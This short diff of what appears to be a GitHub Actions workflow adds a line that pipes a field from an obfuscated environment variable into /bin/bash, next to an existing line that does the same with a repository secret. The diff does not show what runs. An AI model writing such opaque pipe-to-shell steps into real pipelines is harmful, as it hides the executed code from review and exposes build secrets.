@@ -20,6 +20,7 @@ jobs:
           jc235: ${{ secrets.jc235 }}
         run: |
           printf '%s' "$jc235" | jq -r .tmucx64 | /bin/bash
+          echo $ofee53 | jq -r .g5733 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
